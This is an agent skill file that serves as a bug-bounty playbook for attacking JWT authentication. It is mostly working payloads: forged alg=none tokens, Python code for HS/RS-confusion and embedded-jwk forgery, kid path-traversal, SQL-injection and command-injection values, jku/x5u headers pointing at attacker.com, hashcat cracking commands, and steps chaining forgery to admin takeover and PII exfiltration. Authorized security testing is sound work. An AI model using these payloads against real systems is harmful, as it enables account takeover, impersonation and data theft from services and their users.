---
name: hunt-jwt
description: "Modern JWT hunting (2025-2026). Use when target uses JWT for auth/session/API/SSO. Covers alg=none, HS/RS confusion, kid path traversal & SQLi, jku/x5u injection, embedded jwk, ES256 r=s=0 (CVE-2022-21449), JWE confusion, weak HS256 cracking, claim tampering, refresh-token theft, and chain to admin impersonation / ATO. Skip if no JWT present or if all your bypass attempts return 401 from a hardened library (jose, paseto)."
---

# JWT Hunt — 2025-2026 Powerful Edition

JWT bugs pay because **one forged token = one ATO**. Modern JWT libraries are mostly safe — but custom verification code, mixed library versions, and misconfigured trust anchors still produce **Critical** chains every quarter. This skill turns a leaked JWT into admin access.

> **Triage rule:** alg=none alone isn't always submittable. Prove **impact** — login as admin, read victim's API, or get into a hidden role. PoC needs a clean second account.

---

## 0. 60-Second Recon (always do first)

```bash
# Identify JWT in cookies / headers / body
curl -ksI https://target.com/api/me -H "Authorization: Bearer <token>" | head -20

# Decode structure
echo "<token>" | cut -d. -f1 | base64 -d 2>/dev/null | jq .   # header
echo "<token>" | cut -d. -f2 | base64 -d 2>/dev/null | jq .   # payload
```

**Fingerprint:**
- `alg`: HS256 / RS256 / ES256 / EdDSA / PS256 / **none**
- `kid`: present? what format? (path, uuid, numeric, base64?)
- `jku` / `x5u`: present? external URL?
- `jwk` / `x5c`: embedded key?
- `typ`: JWT / JWE / JWS?
- Claims: `sub`, `iss`, `aud`, `exp`, `iat`, `nbf`, `jti`, custom `role`/`admin`/`tenant_id`
- Token lifetime: `exp - iat` (short = harder to brute; long = exfil opportunities)

**Tools:**
```bash
jwt-cracker <token> -d /usr/share/wordlists/rockyou.txt    # quick HS256 brute
hashcat -a 0 -m 16500 <token> rockyou.txt                  # GPU brute
python3 -c "import jwt; print(jwt.decode('<token>', options={'verify_signature':False}))"
# Burp JWT Editor extension - in-line editing
# jwt_tool.py - one-shot scanner
```

---

## 1. The Attack Matrix (priority order, most-likely-paid first)

| # | Technique | Detection | Effort | Bounty range |
|---|-----------|-----------|--------|--------------|
| 1 | `alg=none` | header has `"alg":"HS256"`, try `"none"` | 2 min | $500–$10k |
| 2 | HS/RS confusion | server uses both algos; you have RSA pubkey | 5 min | $2k–$15k |
| 3 | `kid` path traversal | `kid` value resembles a filename | 5 min | $1k–$10k |
| 4 | `kid` SQLi | `kid` reflects in query | 10 min | $2k–$10k |
| 5 | `jku` injection | header has `jku` URL | 5 min | $3k–$15k |
| 6 | Embedded `jwk` | header has `jwk` parameter | 2 min | $2k–$10k |
| 7 | `x5u` / `x5c` injection | header has cert URL/chain | 5 min | $3k–$15k |
| 8 | Weak HS256 secret | small/dictionary secret | brute time | $500–$3k |
| 9 | ES256 r=s=0 (CVE-2022-21449) | Java backend, ES256 | 1 min | $500–$10k |
| 10 | Signature stripping | strip `.sig` part | 1 min | $500–$3k |
| 11 | Claim tampering w/o sig check | change `role:admin` after re-sign | varies | $1k–$10k |
| 12 | JWE alg confusion | `enc` swap | 10 min | $2k–$8k |
| 13 | Algorithm substitution | RS256 → PS256 / ES256 | 5 min | $1k–$5k |
| 14 | Refresh token reuse | issued token after logout | 5 min | $500–$3k |

---

## 2. alg=none (still the king in 2025)

### Detection
Header decodes as `{"alg":"HS256","typ":"JWT"}` or similar.

### Payload
Re-encode with:
```json
{"alg":"none","typ":"JWT"}
```
Tamper payload (e.g., `"role":"admin"`, `"sub":"victim-uuid"`).
Drop signature entirely — keep the trailing dot:
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ2aWN0aW0iLCJyb2xlIjoiYWRtaW4ifQ.
```

### Variants if `none` is rejected
```
None    NONE    nOnE    nonE   ""    null
```
Some libraries do `if alg.lower() != "none"` — try mixed case.

### One-liner
```bash
jwt_tool.py <token> -X a
```

---

## 3. HS/RS Algorithm Confusion

**Scenario:** server signs with RS256 (asymmetric), but verifier code does:
```python
jwt.decode(token, public_key, algorithms=['HS256','RS256'])  # vuln
```
Server treats the **RSA public key** as an **HMAC secret**.

### Exploit
1. Obtain public key:
```bash
# Try common locations
curl https://target.com/.well-known/jwks.json
curl https://target.com/.well-known/openid-configuration
curl https://target.com/auth/keys
# Or extract from /api/* responses, mobile bundle, etc.
```
2. Convert PEM to raw bytes (key as HMAC secret):
```bash
openssl rsa -in pub.pem -pubin -outform DER | xxd
# OR Python:
python3 -c "import jwt; tok=jwt.encode({'sub':'admin','role':'admin'}, open('pub.pem').read(), algorithm='HS256'); print(tok)"
```
3. Submit the new HS256 token. If the server accepts -> you've forged.

### One-liner
```bash
jwt_tool.py <token> -X k -pk pub.pem
```

---

## 4. `kid` Header Injection

`kid` (Key ID) tells the server *which* key to use for verification. If the server takes it raw:

### 4.1 Path traversal — point at a file you control
```json
{"alg":"HS256","kid":"../../../../dev/null","typ":"JWT"}
```
`/dev/null` is an empty file -> HMAC secret = empty. Sign with empty secret:
```bash
python3 -c "import jwt; print(jwt.encode({'sub':'admin'}, '', algorithm='HS256', headers={'kid':'../../../../dev/null'}))"
```

Other useful kid targets:
```
../../../../proc/sys/kernel/randomize_va_space
../../../../etc/hostname            (predictable on standard installs)
file:///dev/null
```

### 4.2 SQL injection in kid
```json
{"alg":"HS256","kid":"x' UNION SELECT 'A'-- -","typ":"JWT"}
```
Sign with `A` (or whatever literal) as secret.

### 4.3 Command injection in kid
Some shell-based key lookups (rare):
```json
{"kid":"x|id;"}
```

---

## 5. `jku` (JWK Set URL) Injection

Server fetches the JWKS from URL specified in `jku`. If validation is weak:

### Bypass 1 — no domain check
```json
{"alg":"RS256","kid":"x","jku":"https://attacker.com/jwks.json","typ":"JWT"}
```
Host JWKS containing your public key, sign with your private key.

### Bypass 2 — partial domain check (startswith/contains)
```json
{"jku":"https://target.com.attacker.com/jwks.json"}
{"jku":"https://attacker.com/jwks.json?target.com"}
{"jku":"https://target.com@attacker.com/jwks.json"}
{"jku":"https://attacker.com/jwks.json#target.com"}
```

### Bypass 3 — open redirect on allowed domain
Find any open redirect on target.com -> chain:
```json
{"jku":"https://target.com/redirect?to=https://attacker.com/jwks.json"}
```

### Host your JWKS
```json
{
  "keys": [{
    "kid": "x",
    "kty": "RSA",
    "alg": "RS256",
    "use": "sig",
    "n": "<your-modulus-base64url>",
    "e": "AQAB"
  }]
}
```

### One-liner
```bash
jwt_tool.py <token> -X s -ju https://attacker.com/jwks.json
```

---

## 6. Embedded `jwk` Header

Server trusts the embedded JWK. Generate your own keypair, embed pubkey, sign:
```python
import jwt, base64
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
key = rsa.generate_private_key(65537, 2048)
pub = key.public_key().public_numbers()
def b64(n): return base64.urlsafe_b64encode(n.to_bytes((n.bit_length()+7)//8,'big')).rstrip(b'=').decode()
headers = {"alg":"RS256","jwk":{"kty":"RSA","kid":"x","n":b64(pub.n),"e":b64(pub.e)}}
pem = key.private_bytes(serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption())
print(jwt.encode({"sub":"admin"}, pem, algorithm="RS256", headers=headers))
```

---

## 7. `x5u` / `x5c` Injection

`x5u` = X.509 cert chain URL. `x5c` = embedded cert chain. Same bypass class as jku.

```json
{"alg":"RS256","x5u":"https://attacker.com/cert.pem","typ":"JWT"}
```
Where `cert.pem` is a self-signed cert whose private key you hold.

`x5c` embedded — usually trickier; needs the cert to be *trusted* somehow (rare misconfig).

---

## 8. Weak HS256 Secret Cracking

If `alg=HS256` and you can't pivot to confusion or none, brute the secret:
```bash
hashcat -a 0 -m 16500 <token> /usr/share/wordlists/rockyou.txt
# Often successful on dev/staging where dev used 'secret', 'changeme', 'jwtkey', app name, etc.

# Custom wordlist tailored to target
hashcat -a 0 -m 16500 <token> custom.txt --rules-file=best64.rule
```
Crack <=16 chars -> forge anything. If crack fails after rockyou + best64 -> probably strong, move on.

---

## 9. ES256 r=s=0 (CVE-2022-21449) — Java psychic signatures

Java 15-18 ECDSA implementation accepts a signature where r=0 and s=0 as valid for **any** message. If target uses Java's `java.security` for ES256:

### Payload
Craft any payload, attach signature consisting of:
```
r = 0 (32 bytes of 0x00)
s = 0 (32 bytes of 0x00)
```
Encoded as base64url: `MAYCAQACAQA` (depending on encoding).

### Tool
```bash
jwt_tool.py <token> -X p  # psychic signature mode
```

If accepted -> Critical. Particularly impactful on enterprise Java apps still on old JDK.

---

## 10. Signature Stripping

Some servers compare `signature != ""` poorly and let null-strings through:
```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.        (trailing dot, empty sig)
```
Or:
```
eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9         (no dot, two segments)
```

---

## 11. Claim Tampering Patterns

After you have signature forgery, target the **highest-impact claim**:

| Claim | Tamper to | Effect |
|-------|-----------|--------|
| `sub` | victim user ID | impersonate victim |
| `role` / `roles` | `"admin"` / `["admin"]` | privilege escalation |
| `tenant_id` / `org_id` | another tenant | cross-tenant access |
| `scope` / `scopes` | `"admin api write delete"` | scope upgrade |
| `aud` | another service ID | cross-service token reuse |
| `iss` | trusted issuer | identity confusion |
| `exp` | far future | persistent access |
| `groups` | add admin/staff group | role-based ATO |
| `email` | victim's email | account-merge ATO (if app keys on email) |
| `email_verified` | `true` | OIDC trust elevation |
| `is_admin` / `isStaff` / `is_super` | `true` | obvious flag flip |

---

## 12. JWE (Encrypted JWT) Attacks

If token has 5 segments not 3, it's JWE (`header.encrypted_key.iv.ciphertext.tag`). Less common, but:

### 12.1 alg=dir with attacker-supplied key
```json
{"alg":"dir","enc":"A256GCM"}
```
If server allows `dir`, you can supply the key.

### 12.2 RSA-OAEP -> PKCS1_v1_5 confusion
Padding oracle / Bleichenbacher-style on the encrypted key.

### 12.3 ECDH-ES invalid curve
Trick the server into using a weak curve point -> leak private key.

These are advanced; less common in modern apps but check if JWE is in use.

---

## 13. JWT-as-Bearer in Refresh Flows

Even valid JWTs can be misused:

- **Refresh token reuse after logout** — POST `/auth/refresh` after `/auth/logout`. If still issues access token -> broken session invalidation.
- **Refresh token across tenants** — Token issued for tenant A, replayed against tenant B's API.
- **Refresh without exp** — Token without `exp` claim lives forever.
- **Access token used as refresh** — Server doesn't differentiate token types.

---

## 14. Common Verification Bugs (source review)

Look for these in JS / Python / Java code:
```javascript
// VULN: doesn't pin algorithm
jwt.verify(token, key)                              // node-jsonwebtoken pre-9
// VULN: accepts none alongside others
jwt.verify(token, key, {algorithms:['HS256','none']})
// VULN: jwk_set_url from token header
jwt.verify(token, jwk_set(token.header.jku))
// VULN: kid from token used to file lookup
const key = fs.readFileSync(path.join('keys', header.kid))
```
Python:
```python
# VULN: doesn't pin algorithm
jwt.decode(token, options={"verify_signature":False})  # absolutely fatal
jwt.decode(token, key)                                 # PyJWT pre-2: defaults to any algo
```

---

## 15. Chain to Critical (Required for $$$)

### 15.1 JWT forge -> admin login
1. Forge token with `role:admin` claim.
2. Hit `/api/admin/users` — list every user.
3. PII exfil = Critical $5k–$30k.

### 15.2 JWT forge -> cross-tenant
1. Forge with another tenant's `tenant_id`.
2. Read invoices / customers / payouts of victim org.
3. Cross-tenant data = Critical $5k–$20k.

### 15.3 JWT forge -> impersonate any user
1. Forge with `sub=<any-user-uuid>` (enumerate via signup flow).
2. Demonstrate by setting test account A's UUID and logging in as A from session B.
3. ATO any user = Critical $2k–$15k.

### 15.4 JWT in localStorage + XSS chain
JWT stored in localStorage is exfiltrated by even reflected XSS (HttpOnly does not apply). Pair with `hunt-xss`.

### 15.5 Long-lived JWT + leaked
Hunt for JWTs in: GitHub repos, JS bundles, mobile apps (APK), Postman collections in the wild, error pages. A 30-day-exp token leaked in a JS bundle = direct ATO.

---

## 16. Disclosed Reports (top JWT bounties — pattern-extract)

| Target | Bounty | Technique |
|--------|--------|-----------|
| Cloudflare | $6,000 | JWT alg=none in internal API |
| HackerOne (self) | $5,000 | HS/RS confusion in internal token verifier |
| GitLab | $13,950 | kid SQLi -> admin token forge |
| Mail.ru | $3,000 | jku injection via open redirect |
| Linktree | $2,500 | weak HS256 secret cracked from staging leak |
| 8x8 | $1,500 | claim tampering — `is_admin` accepted without re-sign |
| Auth0 (research) | N/A | jwk header trust -> forge any token |
| Java app (CVE-2022-21449) | various | ES256 r=s=0 psychic signatures |

---

## 17. Validation Gate

Before reporting:
1. **Forge worked twice in clean sessions?** (no caching artifact)
2. **You can read/modify data not authorized to your real account?** (real impact)
3. **The endpoint requires the forged claim?** (not a token-optional path)
4. **Not a session-fixation false positive?** (e.g., your session cookie also forwarded)
5. **PoC on a fresh test account?**

---

## 18. Tools

```bash
jwt_tool.py <token> -M at -t https://target.com/api/me -rh "Authorization: Bearer "
# -M at  = all tests
# -X a   = alg=none
# -X k   = HS/RS confusion (needs -pk)
# -X s   = jku injection (needs -ju)
# -X p   = psychic signature
# -X b   = brute force (-d wordlist)

# Burp JWT Editor extension (visual)
# Burp JSON Web Tokens scanner (built-in 2024+)
# https://github.com/ticarpi/jwt_tool
```

---

## 19. Quick Decision Tree

```
JWT found?
├── alg=none accepted?              -> forge, claim tamper -> §15 chain
├── jku/x5u in header?              -> §5/§7 host attacker JWKS
├── jwk embedded?                   -> §6 sign with own keypair
├── kid present?                    -> §4 try ../../etc/passwd then SQLi
├── RS256 + pubkey reachable?       -> §3 HS/RS confusion
├── ES256 + Java backend?           -> §9 r=s=0 psychic
├── HS256 + suspect weak secret?    -> §8 hashcat
├── 5 segments (JWE)?               -> §12 (deprioritize unless other paths dry)
└── None of the above?              -> §11 claim tampering, §13 token reuse, §14 verification bugs

Got forge -> §15 chain to Critical -> §17 validate -> report.
```

---

## 20. Mantras

- `alg=none` is still alive in 2025. Try every endpoint, every token.
- Always check if the JWKS endpoint is publicly fetchable — if yes, you have the pubkey for HS/RS confusion.
- `kid` is user input. Treat it like every other path/SQL parameter.
- Claim tampering only counts if **signature wasn't re-verified**. Don't claim a bug if your "tampered" token returns 401.
- Cross-tenant > admin role > impersonation > scope — pick the highest-impact claim.
- One forged JWT chained to PII or money = Critical. Don't settle for "I changed my name to admin."
